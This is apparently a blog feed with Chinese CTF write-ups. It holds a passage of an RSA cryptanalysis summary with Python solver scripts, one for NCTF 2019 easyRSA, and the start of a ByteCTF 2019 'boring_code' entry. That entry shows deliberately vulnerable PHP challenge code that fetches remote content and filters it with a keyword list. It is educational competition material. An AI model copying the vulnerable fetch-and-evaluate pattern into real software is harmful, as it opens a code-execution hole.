class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,<span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>,<span class="number">257</span>,<span class="number">263</span>,<span class="number">269</span>,<span class="number">271</span>,<span class="number">277</span>,<span class="number">281</span>,<span class="number">283</span>,<span class="number">293</span>,<span class="number">307</span>,<span class="number">311</span>,<span class="number">313</span>,<span class="number">317</span>,<span class="number">331</span>,<span class="number">337</span>,<span class="number">347</span>,<span class="number">349</span>,<span class="number">353</span>,<span class="number">359</span>,<span class="number">367</span>,<span class="number">373</span>,<span class="number">379</span>,<span class="number">383</span>,<span class="number">389</span>,<span class="number">397</span>,<span class="number">401</span>,<span class="number">409</span>,<span class="number">419</span>,<span class="number">421</span>,<span class="number">431</span>,<span class="number">433</span>,<span class="number">439</span>,<span class="number">443</span>,<span class="number">449</span>,<span class="number">457</span>,<span class="number">461</span>,<span class="number">463</span>,<span class="number">467</span>,<span class="number">479</span>,<span class="number">487</span>,<span class="number">491</span>,<span class="number">499</span>,<span class="number">503</span>,<span class="number">509</span>,<span class="number">521</span>,<span class="number">523</span>,<span class="number">541</span>,<span class="number">547</span>,<span class="number">557</span>,<span class="number">563</span>,<span class="number">569</span>,<span class="number">571</span>,<span class="number">577</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">599</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">613</span>,<span class="number">617</span>,<span class="number">619</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">647</span>,<span class="number">653</span>,<span class="number">659</span>,<span class="number">661</span>,<span class="number">673</span>,<span class="number">677</span>,<span class="number">683</span>,<span class="number">691</span>,<span class="number">701</span>,<span class="number">709</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">751</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">797</span>,<span class="number">809</span>,<span class="number">811</span>,<span class="number">821</span>,<span class="number">823</span>,<span class="number">827</span>,<span class="number">829</span>,<span class="number">839</span>,<span class="number">853</span>,<span class="number">857</span>,<span class="number">859</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">883</span>,<span class="number">887</span>,<span class="number">907</span>,<span class="number">911</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">941</span>,<span class="number">947</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">971</span>,<span class="number">977</span>,<span class="number">983</span>,<span class="number">991</span>,<span class="number">997</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Lucas_pow</span><span class="params">(P, R)</span>:</span></span><br><span class="line">    A, B = P, <span class="number">2</span></span><br><span class="line">    R = bin(R)[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> R:</span><br><span class="line">        <span class="keyword">if</span> int(i) == <span class="number">1</span>:</span><br><span class="line">            A, B = (P * A**<span class="number">2</span> - A * B - P) % n, (A**<span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            A, B = (A**<span class="number">2</span> - <span class="number">2</span>) % n, (A * B - P) % n</span><br><span class="line">    <span class="keyword">return</span> gcd(A - <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Williams_p_1</span><span class="params">()</span>:</span></span><br><span class="line">    R = <span class="number">1</span></span><br><span class="line">    B = iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    B = log(B)</span><br><span class="line">    <span class="keyword">for</span> pi <span class="keyword">in</span> prime:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(B//log(pi)):</span><br><span class="line">            R *= pi</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        P = random.randint(<span class="number">2</span>, B)</span><br><span class="line">        p = Lucas_pow(P, R)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> p &lt; n:</span><br><span class="line">            <span class="keyword">return</span> p</span><br></pre></td></tr></table></figure><p>可以看到上述算法的R选取和先前选的m!不同，且采用$V_{f}\rightarrow V_{2f}$的跨度进行递推.</p><p>实验发现在p+1的小素数因子上限B已知时，采取上述方法会明显快一些（当然也可以求出该方法中的R，再通项直接求R，大约5s就能出）.</p><h4 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h4><p><a href="https://math.boisestate.edu/~liljanab/BOISECRYPTFall09/Sundling.pdf" target="_blank" rel="noopener">https://math.boisestate.edu/~liljanab/BOISECRYPTFall09/Sundling.pdf</a></p><p><a href="https://www.ams.org/journals/mcom/1982-39-159/S0025-5718-1982-0658227-7/S0025-5718-1982-0658227-7.pdf" target="_blank" rel="noopener">https://www.ams.org/journals/mcom/1982-39-159/S0025-5718-1982-0658227-7/S0025-5718-1982-0658227-7.pdf</a></p><h3 id="RSA-Square-Root-in-F-p"><a href="#RSA-Square-Root-in-F-p" class="headerlink" title="RSA - Square Root in $F_{p}$"></a>RSA - Square Root in $F_{p}$</h3><h4 id="Theorem-15"><a href="#Theorem-15" class="headerlink" title="Theorem"></a>Theorem</h4><p>Given $b^{2}\equiv a(mod\ p)$</p><ul><li><p>Case 1：$p\equiv 3(mod\ 4)\rightarrow b:=\pm a^{\frac{p+1}{4}}(mod\ p)$</p></li><li><p>Case 2：Cipolla’s algorithm（一般性）</p><ul><li><p>Step 1：在$F_{p}$上找到一个t，使得$u:=t^{2}-a$是一个模p的平方非剩余（因为平方非剩余的概率趋于1/2，所以随机选取并用欧拉判别即可）</p></li><li><p>Step 2：定义$F_{p^{2}}=F_{p}(\sqrt{t^{2}-a})=\\{x+y\sqrt{t^{2}-a}:x,y\in F_{p}\\}$，关于$F_{p^{2}}$是域的证明此处略. （当然，$\omega:=\sqrt{t^{2}-a}$在$F_{p}$上不存在，因此类似虚数存在）.先来证明两个引理：(1) $(x+y\omega)^{p}=\sum_{i=0}^{p}C_{p}^{i}x^{p-i}(y\omega)^{i}$，因为u是平方非剩余，所以$\omega^{p-1}=(\omega^{2})^{\frac{p-1}{2}}=u^{\frac{p-1}{2}}=-1$. 且p均整除二项式展开中间系数，上式可转化为$x^{p}+y^{p}\omega^{p}(费马小定理)=x+y\omega^{p}=x-y\omega$.；(2) $((t+\omega)^{\frac{p+1}{2}})^{2}=(t+\omega)^{p+1}=(t+\omega)(t-\omega)=t^{2}-\omega^{2}=a$.</p><p>所以计算$(t+\omega)^{\frac{p+1}{2}}$即为二次根b.</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-17_17-12-37.png" alt></p></li></ul></li><li><p>Case 3：Atkin’s algorithm（$p\equiv 5(mod\ 8)$）</p><p>$c\leftarrow (2a)^{\frac{p-5}{8}}$</p><p>$i\leftarrow 2ac^{2}$</p><p>$b\leftarrow ac(i-1)$</p></li></ul><h4 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">euler_judge</span><span class="params">(x, p)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> pow(x, (p - <span class="number">1</span>) // <span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow_in_Fp2</span><span class="params">(a, b, n, p)</span>:</span>  <span class="comment"># (a+sqrt(b))^n in Fp^2</span></span><br><span class="line">    states = [(a % p, <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(math.log(n, <span class="number">2</span>))):</span><br><span class="line">        new_state = ((pow(states[i][<span class="number">0</span>], <span class="number">2</span>, p) + b * pow(states[i][<span class="number">1</span>], <span class="number">2</span>, p)) %</span><br><span class="line">                     p, (<span class="number">2</span> * states[i][<span class="number">0</span>] * states[i][<span class="number">1</span>]) % p)</span><br><span class="line">        states.append(new_state)</span><br><span class="line">    n_bin = bin(n)[<span class="number">2</span>:][::<span class="number">-1</span>]</span><br><span class="line">    res_x = <span class="number">1</span></span><br><span class="line">    res_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(n_bin)):</span><br><span class="line">        <span class="keyword">if</span> n_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">            res_x, res_y = (res_x * states[i][<span class="number">0</span>] + res_y * states[i][<span class="number">1</span>]</span><br><span class="line">                            * b) % p, (res_x * states[i][<span class="number">1</span>] + res_y * states[i][<span class="number">0</span>]) % p</span><br><span class="line">    <span class="keyword">return</span> res_x, res_y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square_root</span><span class="params">(a, p)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(euler_judge(a, p) == <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        b = pow(a, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    <span class="keyword">elif</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">        c = pow(<span class="number">2</span> * a, (p - <span class="number">5</span>) // <span class="number">8</span>, p)</span><br><span class="line">        i = (<span class="number">2</span> * a * c**<span class="number">2</span>) % p</span><br><span class="line">        b = (a * c * (i - <span class="number">1</span>)) % p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">        u = t**<span class="number">2</span> - a</span><br><span class="line">        <span class="keyword">while</span> euler_judge(u, p):</span><br><span class="line">            t = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">            u = t**<span class="number">2</span> - a</span><br><span class="line">        b, check = pow_in_Fp2(t, u, (p + <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">        <span class="keyword">assert</span>(check == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> b, -b % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    root = square_root(<span class="number">19</span>, <span class="number">65537</span>)</span><br><span class="line">    print(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-2"><a href="#More-2" class="headerlink" title="More"></a>More</h4><p>有限域下的n-th root其实在sympy中也有函数处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">x = nthroot_mod(a, <span class="number">2</span>, p, all_roots=<span class="literal">False</span>) <span class="comment">#求二次根</span></span><br></pre></td></tr></table></figure><p>但p和n过大时，nthroot_mod在有限域上求解也会变得极其困难，因此下面再做一个该类型的拓展.</p><h3 id="RSA-e-mid-p-1-e-mid-q-1"><a href="#RSA-e-mid-p-1-e-mid-q-1" class="headerlink" title="RSA - $e\mid (p-1),e\mid (q-1)$"></a>RSA - $e\mid (p-1),e\mid (q-1)$</h3><h4 id="Theorem-16"><a href="#Theorem-16" class="headerlink" title="Theorem"></a>Theorem</h4><p>前面提到过$gcd(e,\varphi(n))\neq 1$的情况，但不针对$gcd(e,\varphi(n))=e$，于是这里就对$e\mid (p-1),e\mid (q-1)$的特殊情况进行讨论.</p><p>解题思路即求解m mod p和m mod q，再通过CRT还原m mod n. 主要难点则是在$GF(p)$上求e次根.</p><p>在有限域上求r-th root有两个常见算法（Adleman-Manders-Miller algorithm和Cipolla-Lehmer algorithm），但这里介绍的是Namhun Koo提出的一种更具一般性的开根算法，且在s足够小的时候更高效（$r^{s}\mid (p-1),r^{s}\nmid (p-1)$）.</p><ul><li><strong>New r-th root extraction formula over $F_{q}$ for $q\equiv lr^{s}+1(mod\ r^{s+1})$ and r is a prime</strong></li></ul><p><strong>[Theorem 1]</strong></p><p>设c是在$F_q$上的一个r次剩余，则$\exists b\in F_{q},s.t.\ ord_{q}(c^{r-1}b^{r})=r^{t}.(0\leq t&lt;s)$</p><p>Proof：</p><p>$\because gcd(r,l)=1\quad \therefore\exists(\alpha,\beta),s.t.\ r\beta +r-1=l\alpha$.</p><p>$\alpha =\frac{r\beta +r-1}{l}$，令$\zeta=(c^{\alpha})^{\frac{q-1}{r^{s}}}=(c^{\alpha})^{\frac{q-1}{r^{s}}}c^{r\beta +r-1-l\alpha}=c^{r-1}(c^{\beta+\alpha\frac{q-1-lr^{s}}{r^{s+1}}})^{r}=c^{r-1}b^{r}$.</p><p>$\because c$是$F_{q}$上的r次剩余，且指数含$\frac{q-1}{r^{s}}$，则$ord_{q}(\zeta)=r^{t}.(t&lt;s)$</p><p>则由Theorem 1，我们令$\xi$为$F_{q}$上的一$r^{s}$阶单位根，要取符合要求的$\xi$，我们可以使得$\xi=d^{\frac{q-1}{r^{s}}}$，其中d为模q的r次非剩余（概率约为$\frac{r-1}{r}$）.</p><p>则存在唯一的$(i,j)$，使得$\xi^{r^{s-t}}=\zeta^{i},\zeta=(\xi^{r^{s-t}})^j$，即$ij\equiv 1(mod\ r^{t})$.</p><p><strong>[Theorem 2]</strong></p><p>令$u\equiv j(r^{t}-1)r^{s-t-1}\equiv -jr^{s-t-1}(mod\ r^{s-1})$，则$F_{q}$下c的一个r次根即为$cb\xi^{u}$，b在Theorem 1中已给出定义.</p><p>Proof：</p><p>$(cb\xi^{u})^{r}=cc^{r-1}b^{r}\xi^{ur}=c\zeta\xi^{ur}$.</p><p>$\because u=j(r^{t}-1)r^{s-t-1}+kr^{s-1},\xi^{r^{s}}=1.$</p><p>$\therefore \zeta\xi^{ur}=(\xi^{r^{s-t}})^{j}\xi^{ur}=\xi^{jr^{s-t}+ur}=\xi^{jr^{s-t}+kr^{s}+j(r^{t}-1)r^{s-t}}=\xi^{jr^{s}}=1.$</p><p>$\therefore (cb\xi^{u})^{r}=c.$</p><p><strong>[Remark 1]</strong></p><p>Theorem里的$r\beta +r-1=l\alpha$确定的$\alpha$ mod r和$\beta$ mod l是唯一的. 且上式可以扩展到$\frac{q-1}{r}$的模域上（$r\beta + r-1\equiv l\alpha(mod\ \frac{q-1}{r})$），因为c是$F_{q}$上的r次剩余，即$c^{\frac{q-1}{r}}=1$.</p><p><strong>[Remark 2]</strong></p><p>$cb=c^{\beta+1+\alpha\frac{q-1-lr^{s}}{r^{s+1}}}=c^{\frac{(\beta+1)r^{s+1}+\alpha(q-1)-\alpha lr^{s}}{r^{s+1}}}=c^{\frac{r^{s}((\beta+1)r-\alpha l)+\alpha(q-1)}{r^{s+1}}}=c^{\frac{1+\frac{\alpha(q-1)}{r^{s}}}{r}}.$</p><p><strong>[Remark 3]</strong></p><p>Theorem 1结尾提到的$(i,j)$在$r^{t}$较大时求解困难，因此本方法在r和t过大时并不高效.</p><p><strong>[利用]</strong></p><ul><li><p>s = 1时（即$q\equiv lr+1(mod\ r^{2})$时）</p><p>$\because t&lt;s\quad\therefore t=0,u=0.$</p><p>$cb\xi^{u}=cb$即为一个满足要求的r次根.</p><p>由Remark 3知，$cb=c^{\frac{1+\frac{\alpha(q-1)}{r^{s}}}{r}}=c^{\frac{1+\frac{\alpha(q-1)}{r}}{r}}$，至于$\alpha$可以通过扩展欧几里得算法很轻易得到.</p></li><li><p>s &gt; 1时，t可能落在{0, …, s - 1}上，因此分析时要分的情况会多不少（在这里就不占篇幅去写了，paper链接会在Link中给出）</p></li><li><p>上述算法给出的只是$G_{q}$上c的其中一个r次根，但要找出所有的r次根也很简单，只要借助r次单位根即可</p><p>$G_{q}$上的r次单位根($r\mid (q-1)$)为{$x^{i(\frac{q-1}{r})}$}($i\in[0,q)$), 我们取一个不为1的r次单位根与我们先前找到的特解生成一个r阶循环群即找到通解.</p></li></ul><h4 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rthroot</span><span class="params">(c, r, q)</span>:</span></span><br><span class="line">    c %= q</span><br><span class="line">    <span class="keyword">assert</span>(isPrime(r) <span class="keyword">and</span> (q - <span class="number">1</span>) % r == <span class="number">0</span> <span class="keyword">and</span> (q - <span class="number">1</span>) % (r**<span class="number">2</span>) != <span class="number">0</span>)</span><br><span class="line">    l = ((q - <span class="number">1</span>) % (r**<span class="number">2</span>)) // r</span><br><span class="line">    alpha = (-inverse(l, r)) % r</span><br><span class="line">    root = pow(c, ((<span class="number">1</span> + alpha * (q - <span class="number">1</span>) // r) // r), q)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allroot</span><span class="params">(r, q, root)</span>:</span></span><br><span class="line">    all_root = set()</span><br><span class="line">    all_root.add(root)</span><br><span class="line">    <span class="keyword">while</span> len(all_root) &lt; r:</span><br><span class="line">        new_root = root</span><br><span class="line">        unity = pow(getRandomRange(<span class="number">2</span>, q), (q - <span class="number">1</span>) // r, q)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            new_root = (new_root * unity) % q</span><br><span class="line">            all_root.add(new_root)</span><br><span class="line">    <span class="keyword">return</span> all_root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def crt(ai, mi):</span></span><br><span class="line"><span class="string">    a1, m1 = ai[0], mi[0]</span></span><br><span class="line"><span class="string">    a2, m2 = ai[1], mi[1]</span></span><br><span class="line"><span class="string">    return (a1 * inverse(m2, m1) * m2 + a2 * inverse(m1, m2) * m1) % (m1 * m2)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(proot, qroot, p, q)</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    total = len(proot) * len(qroot)</span><br><span class="line">    step = total // <span class="number">100</span></span><br><span class="line">    t1 = inverse(q, p)</span><br><span class="line">    t2 = inverse(p, q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> proot:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> qroot:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count % step == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">'\r&#123;&#125;%'</span>.format(count // step), end=<span class="string">''</span>)</span><br><span class="line">            <span class="comment">#root = (i, j)</span></span><br><span class="line">            <span class="comment">#m = crt(root, (p, q))</span></span><br><span class="line">            m = (i * t1 * q + j * t2 * p) % (p * q)</span><br><span class="line">            <span class="keyword">if</span> unhexlify(hex(m)[<span class="number">2</span>:<span class="number">10</span>]) == <span class="string">b'NCTF'</span>:</span><br><span class="line">                print(<span class="string">'\n'</span>, long_to_bytes(m))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">    q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">    e = <span class="number">0x1337</span></span><br><span class="line">    c = <span class="number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span></span><br><span class="line">    print(<span class="string">'[+] Calculating e-th root...'</span>)</span><br><span class="line">    start = time.clock()</span><br><span class="line">    proot = rthroot(c, e, p)</span><br><span class="line">    qroot = rthroot(c, e, q)</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'[*] Cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">    print(<span class="string">'[+] Calculating all e-th roots...'</span>)</span><br><span class="line">    start = time.clock()</span><br><span class="line">    all_proot = allroot(e, p, proot)</span><br><span class="line">    all_qroot = allroot(e, q, qroot)</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'[*] Cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">    print(<span class="string">'[+] CRT cracking...'</span>)</span><br><span class="line">    start = time.clock()</span><br><span class="line">    decrypt(all_proot, all_qroot, p, q)</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'[*] Cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-3"><a href="#More-3" class="headerlink" title="More"></a>More</h4><p>exp对应2019-NCTF-easyRSA.</p><p>做完以后去找了官方wp，发现预期解是Adleman-Manders-Miller algorithm，这里给出链接</p><p><a href="http://www.soreatu.com/ctf/writeups/Writeup for Crypto problems in NCTF 2019.html#easyrsa" target="_blank" rel="noopener">http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa</a></p><p>[注]</p><p>exp第一次调试的时候发现速度很慢-.-后来发现是大量crt的调用使得计算了接近$e^{2}$次的inverse(p, q)和inverse(q,p)，因此将这两个crt中用到的变量锁定即可.</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-25_09-54-37.png" alt></p><h4 id="Link-1"><a href="#Link-1" class="headerlink" title="Link"></a>Link</h4><p><a href="https://eprint.iacr.org/2013/117.pdf" target="_blank" rel="noopener">https://eprint.iacr.org/2013/117.pdf</a></p><p><a href="https://arxiv.org/pdf/1111.4877.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1111.4877.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ByteCTF2019] - boring_code</title>
      <link href="/2019/10/22/ByteCTF2019-boring-code/"/>
      <url>/2019/10/22/ByteCTF2019-boring-code/</url>
      
        <content type="html"><![CDATA[<h2 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h2><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'$url: '</span>.$url.<span class="string">"\n"</span>);</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'$code: '</span>.$code.<span class="string">"\n"</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, 